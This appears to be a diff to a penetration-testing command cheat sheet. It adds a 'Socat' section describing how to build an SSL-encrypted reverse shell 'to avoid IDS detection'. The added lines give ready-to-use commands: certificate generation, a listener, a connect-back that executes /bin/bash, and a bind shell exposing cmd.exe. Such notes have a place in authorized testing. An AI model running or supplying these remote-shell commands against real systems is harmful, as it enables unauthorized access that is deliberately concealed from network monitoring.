@@ -24,6 +24,29 @@ Collection of useful penetration testing and hacking commands.
 
 ----
 
+## Socat
+How to make a secured reverse shell (to avoid IDS detection)
+````
+# Generate SSL
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+cat shell.key shell.crt > shell.pem
+
+# Setup reverse shell listener :
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+
+# Connect back
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+
+# Binding mode
+- Target
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+- Attacker
+socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+
+````
+
+----
+
 ## NFS
 
 - Enumerate share
